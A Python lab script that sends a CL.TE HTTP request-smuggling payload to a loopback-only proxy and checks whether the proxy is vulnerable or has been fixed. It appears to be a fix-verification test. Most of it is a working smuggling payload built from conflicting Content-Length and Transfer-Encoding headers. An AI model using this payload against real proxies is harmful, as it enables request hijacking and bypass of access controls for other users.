#!/usr/bin/env python3
"""Send one fixed CL.TE lab case to the loopback-only proxy."""
import argparse
import socket


def read_response(reader):
    status = reader.readline()
    if not status:
        raise RuntimeError("proxy closed before responding")
    headers = {}
    while True:
        line = reader.readline()
        if line in (b"\r\n", b""):
            break
        name, _, value = line.decode("latin1").partition(":")
        headers[name.lower()] = value.strip()
    size = int(headers.get("content-length", "0"))
    body = reader.read(size)
    return status.decode("latin1").strip(), headers, body.decode("latin1", "replace")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--expect", choices=("vulnerable", "fixed"), required=True)
    parser.add_argument("--port", type=int, default=8080)
    args = parser.parse_args()

    # The proxy reads this entire chunked-looking body according to Content-Length.
    smuggled = b"GET /smuggled HTTP/1.1\r\nHost: lab\r\n\r\n"
    chunked_body = b"0\r\n\r\n" + smuggled
    attack = (
        b"POST /front HTTP/1.1\r\n"
        b"Host: lab\r\n"
        + f"Content-Length: {len(chunked_body)}\r\n".encode()
        + b"Transfer-Encoding: chunked\r\n"
        + b"Connection: keep-alive\r\n\r\n"
        + chunked_body
    )
    legit = b"GET /legit HTTP/1.1\r\nHost: lab\r\nConnection: keep-alive\r\n\r\n"

    if args.expect == "vulnerable":
        with socket.create_connection(("127.0.0.1", args.port), timeout=3) as sock:
            sock.settimeout(3)
            sock.sendall(attack + legit)
            reader = sock.makefile("rb")
            first = read_response(reader)
            second = read_response(reader)
        print(f"Response 1: {first[0]} path={first[1].get('x-lab-origin-path')} body={first[2].strip()}")
        print(f"Response 2: {second[0]} path={second[1].get('x-lab-origin-path')} body={second[2].strip()}")
        if second[1].get("x-lab-origin-path") != "/smuggled":
            raise SystemExit("FAIL: expected the smuggled origin response to occupy the legit response slot")
        print("CONFIRMED: front-end CL framing and origin TE framing desynchronized.")
    else:
        with socket.create_connection(("127.0.0.1", args.port), timeout=3) as sock:
            sock.settimeout(3)
            sock.sendall(attack)
            reader = sock.makefile("rb")
            status, headers, body = read_response(reader)
        print(f"Ambiguous request: {status}; {body.strip()}")
        if not status.startswith("HTTP/1.1 400"):
            raise SystemExit("FAIL: fixed proxy did not reject the ambiguous request")
        with socket.create_connection(("127.0.0.1", args.port), timeout=3) as sock:
            sock.settimeout(3)
            sock.sendall(legit)
            status, headers, body = read_response(sock.makefile("rb"))
        print(f"Clean request: {status} path={headers.get('x-lab-origin-path')} body={body.strip()}")
        if headers.get("x-lab-origin-path") != "/legit":
            raise SystemExit("FAIL: clean request did not reach origin normally")
        print("FIX CONFIRMED: ambiguous framing rejected; clean request remains functional.")


if __name__ == "__main__":
    main()
